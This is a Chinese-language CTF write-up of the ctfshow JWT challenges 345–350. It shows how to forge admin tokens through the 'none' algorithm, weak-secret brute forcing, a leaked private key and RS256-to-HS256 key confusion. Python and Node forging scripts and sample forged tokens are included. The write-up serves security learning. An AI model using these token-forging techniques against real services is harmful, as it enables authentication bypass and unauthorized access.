---
title: ctfshow-jwt
id: ctfshow-jwt
date: 2021-08-25 6:40:33
sidebar_position: 10
---

<!-- more -->

jwt解密：[JSON Web Tokens - jwt.io](https://jwt.io/)
[JSON Web Token (JWT) 攻击技巧 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/2338)



## 345

提升/admin

抓包得到
`auth=eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE2Mjk4MzkxNzcsImV4cCI6MTYyOTg0NjM3NywibmJmIjoxNjI5ODM5MTc3LCJzdWIiOiJ1c2VyIiwianRpIjoiNWU2YmJjZjFhZWVmYmUzMmY2ZDY1OGNhNjhjZTFmYzUifV0`
[JSON Web Tokens - jwt.io](https://jwt.io/)解密一下，或者base64都可以

![](https://i.loli.net/2021/08/25/nP4Yr6st2HJ7ekV.png)

可以看到none，没有加密，也就不存在签名，用base64加密一下直接传cookie就好了

```
eyJhbGciOiJOb25lIiwidHlwIjoiand0In0AW3siaXNzIjoiYWRtaW4iLCJpYXQiOjE2Mjk4NDAzOTksImV4cCI6MTYyOTg0NzU5OSwibmJmIjoxNjI5ODQwMzk5LCJzdWIiOiJhZG1pbiIsImp0aSI6ImE4NDQxMjFkYjRlYTZhNTY0ZDYwZTg1MDBiODU0ZDg3In1d
```

再访问/admin/就拿到flag了

## 346

![](https://i.loli.net/2021/08/25/IDdjWcAeZyPxJHo.png)

看群主方法是secret为弱口令123456，再将user改为admin

还有就是用python将jwt加密算法改为none，user改为admin

> [JSON Web Token (JWT) 攻击技巧 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/2338)
>
> 签名算法可以确保JWT在传输过程中不会被恶意用户所篡改。
>
> 但头部中的alg字段却可以改为none。
>
> 另外，一些JWT库也支持none算法，即不使用签名算法。当alg字段为空时，后端将不执行签名验证。
>
> 将alg字段改为none后，系统就会从JWT中删除相应的签名数据（这时，JWT就会只含有头部 + ‘.’ + 有效载荷 + ‘.’），然后将其提交给服务器。

```python
import base64
def jwtBase64Encode(x):
    return base64.b64encode(x.encode('utf-8')).decode().replace('+', '-').replace('/', '_').replace('=', '')
header = '{"alg":"none","typ":"JWT"}'
payload = '{"iss":"admin","iat":1629840556,"exp":1629847756,"nbf":1629840556,"sub":"admin","jti":"837101c2606dc36952678bce4166379f"} '

print(jwtBase64Encode(header)+'.'+jwtBase64Encode(payload)+'.')
```

## 347

还是弱口令，也可以用[c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker)来将jwt密钥爆破出来
还是123456

![](https://i.loli.net/2021/08/25/8Vz1E6gYWs4jFlI.png)



## 348

爆破，这次用[c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker)：
![](https://i.loli.net/2021/08/25/nXZmP8zy3Ul671I.png)得到密钥aaab
然后丢到[JSON Web Tokens - jwt.io](https://jwt.io/)处理一下即可
![](https://i.loli.net/2021/08/25/dPCkoiBG2hbVRwE.png)

## 349

给了一个app.js

```javascript
/* GET home page. */
router.get('/', function(req, res, next) {
  res.type('html');
  var privateKey = fs.readFileSync(process.cwd()+'//public//private.key');
  var token = jwt.sign({ user: 'user' }, privateKey, { algorithm: 'RS256' });
  res.cookie('auth',token);
  res.end('where is flag?');
  
});

router.post('/',function(req,res,next){
	var flag="flag_here";
	res.type('html');
	var auth = req.cookies.auth;
	var cert = fs.readFileSync(process.cwd()+'//public/public.key');  // get public key
	jwt.verify(auth, cert, function(err, decoded) {
	  if(decoded.user==='admin'){
	  	res.end(flag);
	  }else{
	  	res.end('you are not admin');
	  }
	});
});
```

可以看到是密钥泄漏，可以访问/private.key和/public.key获得私钥和公钥
然后在[JSON Web Tokens - jwt.io](https://jwt.io/)修改即可

![](https://i.loli.net/2021/08/25/bfFKED4WC9lGgLs.png)

修改jwt后post方式访问就可以得到flag

![](https://i.loli.net/2021/08/25/kcPMeTrj4pCiUQB.png)



## 350

给了源码，可以在其中获得公钥public.key

```
-----CTFSHOW 36D BOY -----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDfdIGdsPuxSGPuosgarjZ7zO4t
HHmQ7+6WUiKBA0ykcXe6aK9zcVVKCcEwyMbENgTF4Et8RjZ3NKs1Co74Q+4gII5G
IgQFSS0PzTOKmoTY1fnA6+jqBquV4RnU283kgdaKmkaSRdiwsW2EaagMgZdG6WJk
65RmH98bgnIAGW5nawIDAQAB
-----END PUBLIC KEY-----
```

> [JSON Web Token (JWT) 攻击技巧 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/2338)
>
> HS256算法使用密钥为所有消息进行签名和验证。
>
> 而RS256算法则使用私钥对消息进行签名并使用公钥进行身份验证。
>
> 如果将算法从RS256改为HS256，则后端代码将使用公钥作为密钥，然后使用HS256算法验证签名。
>
> 由于攻击者有时可以获取公钥，因此，攻击者可以将头部中的算法修改为HS256，然后使用RSA公钥对数据进行签名。
>
> 这样的话，后端代码使用RSA公钥+HS256算法进行签名验证。

一开始想用python的（要安装pyjwt模块）

```python
import jwt
payload = {
  "user": "admin",
  "iat": 1629843927
}
public = open('C:\\Users\\11634\\Desktop\\public.key', 'r').read()
# print(public)
info = jwt.encode(payload, key=public, algorithm='HS256')
print(info)

```

但是发现生成的payload会报错：Cannot read property 'user' of undefined
看了羽师傅的博客猜测是jwt版本上不太对应，还是用羽师傅的node脚本：

jwt库要用题目给的源码中的，就是要保证版本一致。
把脚本文件和public.key都丢到源码文件夹里运行即可

```apl
const jwt = require('jsonwebtoken');
var fs = require('fs');
var privateKey = fs.readFileSync('public.key');
var token = jwt.sign({ user: 'admin' }, privateKey, { algorithm: 'HS256' });
console.log(token)
```

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2Mjk4NDQ1Njl9.fsSZJ7uaowtF4NP64WBTPunft-PuQykWdYa4iTup0KI
```

还是post传即可得到flag